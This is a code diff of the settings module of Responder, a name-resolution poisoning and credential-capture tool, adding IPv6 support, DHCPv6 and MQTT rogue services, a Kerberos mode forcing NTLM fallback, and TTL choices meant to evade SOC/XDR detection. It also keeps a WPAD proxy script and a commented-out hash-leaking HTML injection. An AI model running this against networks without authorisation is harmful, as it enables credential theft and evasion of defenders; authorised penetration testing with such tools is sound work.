@@ -23,7 +23,7 @@ import subprocess
 
 from utils import *
 
-__version__ = 'Responder 3.1.3.0'
+__version__ = 'Responder 3.2.2.0'
 
 class Settings:
 	
@@ -42,25 +42,56 @@ class Settings:
 		return str.upper() == 'ON'
 
 	def ExpandIPRanges(self):
-		def expand_ranges(lst):
+		def expand_ranges(lst):	
 			ret = []
 			for l in lst:
-				tab = l.split('.')
-				x = {}
-				i = 0
-				for byte in tab:
-					if '-' not in byte:
-						x[i] = x[i+1] = int(byte)
-					else:
-						b = byte.split('-')
-						x[i] = int(b[0])
-						x[i+1] = int(b[1])
-					i += 2
-				for a in range(x[0], x[1]+1):
-					for b in range(x[2], x[3]+1):
-						for c in range(x[4], x[5]+1):
-							for d in range(x[6], x[7]+1):
-								ret.append('%d.%d.%d.%d' % (a, b, c, d))
+				if ':' in l: #For IPv6 addresses, similar to the IPv4 version below but hex and pads :'s to expand shortend addresses 
+					while l.count(':') < 7: 
+						pos = l.find('::')
+						l = l[:pos] + ':' + l[pos:]
+					tab = l.split(':')
+					x = {}
+					i = 0
+					xaddr = ''
+					for byte in tab:
+						if byte == '':
+							byte = '0'
+						if '-' not in byte:
+							x[i] = x[i+1] = int(byte, base=16)
+						else:
+							b = byte.split('-')
+							x[i] = int(b[0], base=16)
+							x[i+1] = int(b[1], base=16)
+						i += 2
+					for a in range(x[0], x[1]+1):
+						for b in range(x[2], x[3]+1):
+							for c in range(x[4], x[5]+1):
+								for d in range(x[6], x[7]+1):
+									for e in range(x[8], x[9]+1):
+										for f in range(x[10], x[11]+1):
+											for g in range(x[12], x[13]+1):
+												for h in range(x[14], x[15]+1):
+													xaddr = ('%x:%x:%x:%x:%x:%x:%x:%x' % (a, b, c, d, e, f, g, h))
+													xaddr = re.sub('(^|:)0{1,4}', ':', xaddr, count = 7)#Compresses expanded IPv6 address
+													xaddr = re.sub(':{3,7}', '::', xaddr, count = 7)
+													ret.append(xaddr)
+				else:				
+					tab = l.split('.')
+					x = {}
+					i = 0
+					for byte in tab:
+						if '-' not in byte:
+							x[i] = x[i+1] = int(byte)
+						else:
+							b = byte.split('-')
+							x[i] = int(b[0])
+							x[i+1] = int(b[1])
+						i += 2
+					for a in range(x[0], x[1]+1):
+						for b in range(x[2], x[3]+1):
+							for c in range(x[4], x[5]+1):
+								for d in range(x[6], x[7]+1):
+									ret.append('%d.%d.%d.%d' % (a, b, c, d))
 			return ret
 
 		self.RespondTo = expand_ranges(self.RespondTo)
@@ -83,17 +114,26 @@ class Settings:
 		# Config parsing
 		config = ConfigParser.ConfigParser()
 		config.read(os.path.join(self.ResponderPATH, 'Responder.conf'))
-		
-		# Servers
+
+        # Poisoners
+		self.LLMNR_On_Off    = self.toBool(config.get('Responder Core', 'LLMNR'))
+		self.NBTNS_On_Off    = self.toBool(config.get('Responder Core', 'NBTNS'))
+		self.MDNS_On_Off     = self.toBool(config.get('Responder Core', 'MDNS'))
+		self.DHCPv6_On_Off   = self.toBool(config.get('Responder Core', 'DHCPv6'))
+
+        # Servers
 		self.HTTP_On_Off     = self.toBool(config.get('Responder Core', 'HTTP'))
 		self.SSL_On_Off      = self.toBool(config.get('Responder Core', 'HTTPS'))
 		self.SMB_On_Off      = self.toBool(config.get('Responder Core', 'SMB'))
+		self.QUIC_On_Off     = self.toBool(config.get('Responder Core', 'QUIC'))
 		self.SQL_On_Off      = self.toBool(config.get('Responder Core', 'SQL'))
+		self.MYSQL_On_Off    = self.toBool(config.get('Responder Core', 'MYSQL'))
 		self.FTP_On_Off      = self.toBool(config.get('Responder Core', 'FTP'))
 		self.POP_On_Off      = self.toBool(config.get('Responder Core', 'POP'))
 		self.IMAP_On_Off     = self.toBool(config.get('Responder Core', 'IMAP'))
 		self.SMTP_On_Off     = self.toBool(config.get('Responder Core', 'SMTP'))
 		self.LDAP_On_Off     = self.toBool(config.get('Responder Core', 'LDAP'))
+		self.MQTT_On_Off     = self.toBool(config.get('Responder Core', 'MQTT'))
 		self.DNS_On_Off      = self.toBool(config.get('Responder Core', 'DNS'))
 		self.RDP_On_Off      = self.toBool(config.get('Responder Core', 'RDP'))
 		self.DCERPC_On_Off   = self.toBool(config.get('Responder Core', 'DCERPC'))
@@ -121,6 +161,7 @@ class Settings:
 		self.NOESS_On_Off       = options.NOESS_On_Off
 		self.WPAD_On_Off        = options.WPAD_On_Off
 		self.DHCP_On_Off        = options.DHCP_On_Off
+		self.DHCPv6_On_Off      = options.DHCPv6_On_Off
 		self.Basic              = options.Basic
 		self.Interface          = options.Interface
 		self.OURIP              = options.OURIP
@@ -135,7 +176,30 @@ class Settings:
 		self.DHCP_DNS           = options.DHCP_DNS
 		self.ExternalIP6        = options.ExternalIP6
 		self.Quiet_Mode			= options.Quiet
+		self.AnswerName			= options.AnswerName
+		self.ErrorCode          = options.ErrorCode
+		self.RDNSS_On_Off = options.RDNSS_On_Off
+		self.DNSSL_Domain = options.DNSSL_Domain
 
+		# TTL blacklist. Known to be detected by SOC / XDR
+		TTL_blacklist = [b"\x00\x00\x00\x1e", b"\x00\x00\x00\x78", b"\x00\x00\x00\xa5"]
+		# Lets add a default mode, which uses Windows default TTL for each protocols (set respectively in packets.py)
+		if options.TTL is None:
+			self.TTL = None
+			
+		# Random TTL
+		elif options.TTL.upper() == "RANDOM":
+			TTL = bytes.fromhex("000000"+format(random.randint(10,90),'x'))
+			if TTL in TTL_blacklist:
+				TTL = int.from_bytes(TTL, "big")+1
+				TTL = int.to_bytes(TTL, 4)
+			self.TTL = TTL.decode('utf-8')
+		else:
+			self.TTL = bytes.fromhex("000000"+options.TTL).decode('utf-8')
+
+		#Do we have IPv6 for real?
+		self.IPv6 = utils.Probe_IPv6_socket()
+			
 		if self.Interface == "ALL":
 			self.Bind_To_ALL  = True
 		else:
@@ -169,6 +233,16 @@ class Settings:
 		else:
 			self.ExternalResponderIP6 = self.Bind_To6
 
+		# Kerberos operation mode: CAPTURE (AS-REP hashes) or FORCE_NTLM (force fallback)
+		try:
+			self.KerberosMode = config.get('Kerberos', 'KerberosMode').strip()
+			if self.KerberosMode not in ['CAPTURE', 'FORCE_NTLM']:
+				print('[Config] Invalid KerberosMode: %s, defaulting to CAPTURE' % self.KerberosMode)
+				self.KerberosMode = 'CAPTURE'
+		except:
+			# Default to CAPTURE mode if not specified (backward compatible)
+			self.KerberosMode = 'CAPTURE'
+        
 		self.Os_version      = sys.platform
 
 		self.FTPLog          = os.path.join(self.LogDir, 'FTP-Clear-Text-Password-%s.txt')
@@ -176,6 +250,7 @@ class Settings:
 		self.POP3Log         = os.path.join(self.LogDir, 'POP3-Clear-Text-Password-%s.txt')
 		self.HTTPBasicLog    = os.path.join(self.LogDir, 'HTTP-Clear-Text-Password-%s.txt')
 		self.LDAPClearLog    = os.path.join(self.LogDir, 'LDAP-Clear-Text-Password-%s.txt')
+		self.MQTTLog	     = os.path.join(self.LogDir, 'MQTT-Clear-Text-Password-%s.txt')
 		self.SMBClearLog     = os.path.join(self.LogDir, 'SMB-Clear-Text-Password-%s.txt')
 		self.SMTPClearLog    = os.path.join(self.LogDir, 'SMTP-Clear-Text-Password-%s.txt')
 		self.MSSQLClearLog   = os.path.join(self.LogDir, 'MSSQL-Clear-Text-Password-%s.txt')
@@ -203,17 +278,32 @@ class Settings:
 		self.HtmlToInject     = config.get('HTTP Server', 'HtmlToInject')
 
 		if len(self.HtmlToInject) == 0:
-			self.HtmlToInject = "<img src='file://///"+self.Bind_To+"/pictures/logo.jpg' alt='Loading' height='1' width='1'>"
+			self.HtmlToInject = ""# Let users set it up themself in Responder.conf. "<img src='file://///"+self.Bind_To+"/pictures/logo.jpg' alt='Loading' height='1' width='1'>"
 
 		if len(self.WPAD_Script) == 0:
-			self.WPAD_Script = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; return "PROXY '+self.Bind_To+':3128; PROXY '+self.Bind_To+':3141; DIRECT";}'
+			if self.WPAD_On_Off:
+				self.WPAD_Script = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; return "PROXY '+self.Bind_To+':3128; DIRECT";}'
+				
+			if self.ProxyAuth_On_Off:
+				self.WPAD_Script = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; return "PROXY '+self.Bind_To+':3128; DIRECT";}'
 
 		if self.Serve_Exe == True:	
 			if not os.path.exists(self.Html_Filename):
-				print(utils.color("/!\ Warning: %s: file not found" % self.Html_Filename, 3, 1))
+				print(utils.color("/!\\ Warning: %s: file not found" % self.Html_Filename, 3, 1))
 
 			if not os.path.exists(self.Exe_Filename):
-				print(utils.color("/!\ Warning: %s: file not found" % self.Exe_Filename, 3, 1))
+				print(utils.color("/!\\ Warning: %s: file not found" % self.Exe_Filename, 3, 1))
+
+		# DHCPv6 Server Options
+		try:
+			self.DHCPv6_Domain = config.get('DHCPv6 Server', 'DHCPv6_Domain')
+			self.DHCPv6_SendRA = self.toBool(config.get('DHCPv6 Server', 'SendRA'))
+			self.Bind_To_IPv6 = config.get('DHCPv6 Server', 'BindToIPv6')
+		except:
+		# Defaults if section doesn't exist
+			self.DHCPv6_Domain = ''
+			self.DHCPv6_SendRA = False
+			self.Bind_To_IPv6 = ''
 
 		# SSL Options
 		self.SSLKey  = config.get('HTTPS Server', 'SSLKey')
@@ -223,6 +313,7 @@ class Settings:
 		self.RespondTo         = list(filter(None, [x.upper().strip() for x in config.get('Responder Core', 'RespondTo').strip().split(',')]))
 		self.RespondToName     = list(filter(None, [x.upper().strip() for x in config.get('Responder Core', 'RespondToName').strip().split(',')]))
 		self.DontRespondTo     = list(filter(None, [x.upper().strip() for x in config.get('Responder Core', 'DontRespondTo').strip().split(',')]))
+		self.DontRespondToTLD  = list(filter(None, [x.upper().strip() for x in config.get('Responder Core', 'DontRespondToTLD').strip().split(',')]))
 		self.DontRespondToName_= list(filter(None, [x.upper().strip() for x in config.get('Responder Core', 'DontRespondToName').strip().split(',')]))
 		#add a .local to all provided DontRespondToName
 		self.MDNSTLD           = ['.LOCAL']
@@ -284,7 +375,7 @@ class Settings:
 			pass
 		else:
 			#If it's the first time, generate SSL certs for this Responder session and send openssl output to /dev/null
-			Certs = os.system("./certs/gen-self-signed-cert.sh >/dev/null 2>&1")
+			Certs = os.system(self.ResponderPATH+"/certs/gen-self-signed-cert.sh >/dev/null 2>&1")
 		
 		try:
 			NetworkCard = subprocess.check_output(["ifconfig", "-a"])
@@ -295,10 +386,12 @@ class Settings:
 				NetworkCard = "Error fetching Network Interfaces:", ex
 				pass
 		try:
-			DNS = subprocess.check_output(["cat", "/etc/resolv.conf"])
-		except subprocess.CalledProcessError as ex:
-			DNS = "Error fetching DNS configuration:", ex
-			pass
+			p = subprocess.Popen('resolvectl', stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+			DNS = p.stdout.read()
+		except:
+			p = subprocess.Popen(['cat', '/etc/resolv.conf'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+			DNS = p.stdout.read()
+
 		try:
 			RoutingInfo = subprocess.check_output(["netstat", "-rn"])
 		except:
@@ -311,7 +404,7 @@ class Settings:
 		Message = "%s\nCurrent environment is:\nNetwork Config:\n%s\nDNS Settings:\n%s\nRouting info:\n%s\n\n"%(utils.HTTPCurrentDate(), NetworkCard.decode('latin-1'),DNS.decode('latin-1'),RoutingInfo.decode('latin-1'))
 		try:
 			utils.DumpConfig(self.ResponderConfigDump, Message)
-			utils.DumpConfig(self.ResponderConfigDump,str(self))
+			#utils.DumpConfig(self.ResponderConfigDump,str(self))
 		except AttributeError as ex:
 			print("Missing Module:", ex)
 			pass
